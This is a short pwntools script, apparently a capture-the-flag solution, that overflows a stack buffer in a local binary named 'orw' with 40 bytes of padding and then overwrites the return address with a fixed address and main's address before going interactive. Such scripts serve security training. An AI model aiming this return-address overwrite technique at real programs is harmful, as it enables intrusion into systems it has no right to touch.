from pwn import *

elf = context.binary = ELF('./orw')
# context.log_level = 'debug'

p = process()

payload = b'a'*40
payload += p64(0x0000000000401171)
payload += p64(elf.sym['main'])

p.sendline(payload)

# junk = p.recvuntil('\x00\x00\x00\x00\x00\x00\x00V\x11@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
p.interactive()